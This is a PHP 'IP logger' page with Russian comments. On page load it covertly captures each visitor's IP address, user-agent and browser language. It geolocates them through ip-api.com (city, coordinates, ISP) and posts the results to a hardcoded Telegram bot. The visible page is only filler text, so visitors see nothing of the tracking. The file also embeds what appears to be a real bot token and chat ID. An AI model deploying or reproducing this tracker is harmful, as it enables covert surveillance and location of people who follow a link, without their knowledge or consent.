<?php
ini_set('user_agent', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36');
//В переменную $token нужно вставить токен, который нам прислал @botFather
$token = "6635574760:AAH8eO4nt6V3B0UsNYJsb1jDjOyn__u7jkQ"; // Токен бота сюда
$chat_id = "395881180"; //Чат айди сюда

if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR'];
    }


$browser = $_SERVER['HTTP_USER_AGENT'];

// URL страницы, которую открываем
$url = 'http://ip-api.com/json/'.$ipaddress;

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($ch);
curl_close($ch);

$ipinfo = json_decode($response);

$country = $ipinfo -> country;
$region = $ipinfo -> regionName;
$city = $ipinfo -> city;
$localtime = $ipinfo -> timezone;
$latitude = $ipinfo -> lat;
$longitude = $ipinfo -> lon;
$provider = $ipinfo -> isp;
$timezone = $ipinfo -> timezone;
$language = $_SERVER['HTTP_ACCEPT_LANGUAGE'];



//Собираем в массив то, что будет передаваться боту
$arr = array(
    'IP Logger by Right Decision🙂',
    'IP Адрес: ' => $ipaddress,
    '🏳Страна: ' => $country,
    '🏛Регион: ' => $region,
    '🏢Город: ' => $city,
    '🕐Местное время: ' => $localtime,
    '📡Широта и Долгота: ' => $latitude.' '.$longitude,
    '🗿Интернет провайдер: ' => $provider,
    '💻Браузер и User-Agent: ' => $browser,
    '🌐Язык браузера: ' => $language,
    'Часовой пояс' => $timezone
);

//Настраиваем внешний вид сообщения в телеграме
foreach($arr as $key => $value) {
    $txt .= "<b>".$key."</b> ".$value."%0A";
};

//Передаем данные боту
$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");


?>

<!DOCTYPE html>
<html>
<head>
    <title></title>
</head>
<body>


asdadasd

</body>
</html>